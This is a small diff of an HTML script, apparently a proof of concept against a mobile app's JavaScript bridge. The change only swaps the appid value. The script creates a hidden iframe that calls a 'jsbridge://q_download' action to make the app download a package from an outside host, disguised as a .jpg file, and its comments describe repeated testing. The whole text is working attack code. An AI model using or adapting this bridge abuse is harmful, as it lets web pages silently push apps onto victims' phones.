@@ -2,7 +2,7 @@
     <script>
         //好像必须是https
         var apkurl = "https://www.wulihub.com.cn/gc/JY1477/nouseqqlive.jpg"
-        var appid = "1234567"//每测试一次可以自己换一下
+        var appid = "1234321"//每测试一次可以自己换一下
         x = document.createElement('iframe')
         x.src = "jsbridge://q_download/doDownloadAction/13/" + encodeURIComponent(`{"appid":"${appid}","url":"${apkurl}","packageName":"x","actionCode":"2","appName":"x"}`)
         document.body.append(x) //下载应用
